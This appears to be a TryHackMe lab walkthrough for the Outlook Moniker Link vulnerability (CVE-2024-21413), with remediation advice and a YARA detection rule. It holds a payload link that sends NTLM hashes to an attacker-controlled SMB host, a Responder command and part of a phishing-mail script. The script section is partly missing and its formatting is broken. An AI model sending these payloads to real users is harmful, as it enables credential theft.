# 🧨 TryHackMe - Moniker Link Exploitation (CVE-2024-21413)

This document outlines the TryHackMe room walkthrough for exploiting a critical vulnerability in Microsoft Outlook — **CVE-2024-21413**, known as the Moniker Link vulnerability. It enables attackers to exfiltrate NTLM hashes and potentially perform remote code execution by bypassing Outlook's Protected View feature.

---

## 📌 Task 1: Introduction

On **February 13, 2024**, Microsoft disclosed **CVE-2024-21413**, a vulnerability affecting Microsoft Outlook that allows attackers to bypass Outlook's Protected View and exfiltrate user **NTLM hashes**.

The vulnerability leverages a special type of hyperlink called a **Moniker Link**, which triggers Windows-based components when clicked. When crafted maliciously, it can initiate an **SMB authentication request** from the victim to the attacker's server.

### 🎯 Learning Objectives

### 🔐 Virtual Machine Access Credentials

Use the following credentials to log into the vulnerable machine provided in this room:

![TryHackMe Credentials](https://github.com/user-attachments/assets/ae5ed391-546c-41d7-af7f-990a7983b205)


- Understand how Moniker Links work and bypass Outlook’s security
- Leak NTLM hashes using crafted hyperlinks
- Detect the exploit using YARA/PCAP
- Learn how to mitigate the issue

---

## 🔎 Task 2: Vulnerability Deep Dive

Microsoft Outlook supports rendering emails in HTML and can handle various hyperlinks including `http`, `https`, and `file://`. The vulnerability lies in how Outlook handles **file:// Moniker Links**.

### 🔒 What is Protected View?

![Outlook Protected View Warning](https://github.com/user-attachments/assets/fabdd20b-34f2-4351-8692-92aecc0b5de7)

> Example of Outlook's default behavior when opening hyperlinks from untrusted sources.  
> This dialog is often bypassed using the Moniker Link `!` trick.


Protected View is a security mechanism in Outlook designed to sandbox content from unknown or external sources (e.g., links or macros). It usually prevents suspicious links from being automatically opened.

### 🧨 Bypass via Moniker Link

An attacker can craft a Moniker Link that includes a `!` (exclamation mark) and additional characters to **bypass Protected View**.

#### 📂 Example Payload

```html
<a href="file://ATTACKER_IP/share!exploit">Click me</a>
```

- This causes the victim's system to attempt authentication with the attacker’s SMB server.
- The **NTLMv2 hash** of the victim’s credentials is sent automatically.
- No user interaction is required beyond clicking the link.

Note: While the CVE has RCE potential through Windows COM object abuse, no public PoC currently exists for that part.

## 💥 Task 3: Exploitation

### ⚙️ Step-by-Step Exploit

1. **Start Responder** on the AttackBox:
   ```bash
   sudo responder -I ens5
   ```

   password = "attacker"

   html_content = '''<a href="file://ATTACKER_IP/test!exploit">Click me</a>'''

   msg = MIMEMultipart()
   msg["Subject"] = "CVE-2024-21413"
   msg["From"] = "attacker"
   msg["To"] = receiver_email
   msg.attach(MIMEText(html_content, 'html'))

   server = smtplib.SMTP('MACHINE_IP', 25)
   server.login(sender_email, password)
   server.sendmail(sender_email, [receiver_email], msg.as_string())
   server.quit()
   ```

3. **Configure Script Parameters**
   - Replace `ATTACKER_IP` with your AttackBox IP.
   - Replace `MACHINE_IP` with the IP of the vulnerable mail server.

## 🧪 Task 4: Detection

### 🔍 YARA Rule

```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects Moniker Link exploitation for CVE-2024-21413"
      author = "Florian Roth"
      date = "2024-02-17"

   strings:
      $filelink = /file:\/\/[^"']+!/

   condition:
      filesize < 1000KB and $filelink
}
```

### 📡 Network Detection

### 🧪 Wireshark Packet Capture

Below is a screenshot of Wireshark showing the SMB authentication attempt and the victim’s NTLMv2 hash being sent to the attacker:

![Wireshark NTLMv2](https://github.com/user-attachments/assets/121fa8dd-5705-4473-ba42-46e160a31349)


Using **Wireshark**, filter for:
```
smb2 && ip.addr == VICTIM_IP
```
You’ll observe SMB negotiation packets containing hashed credentials.

## 🔐 Task 5: Remediation

### ✅ Patch Immediately

Microsoft released patches in **February 2024 Patch Tuesday**. Updating Office through Windows Update or Microsoft Update Catalog is essential.

### 📌 Security Best Practices

- Train users not to click unknown or suspicious links
- Implement link preview and reporting mechanisms
- Consider **blocking outbound SMB traffic** at the network level if applicable

Note: Protected View bypass cannot be mitigated via Outlook settings alone.
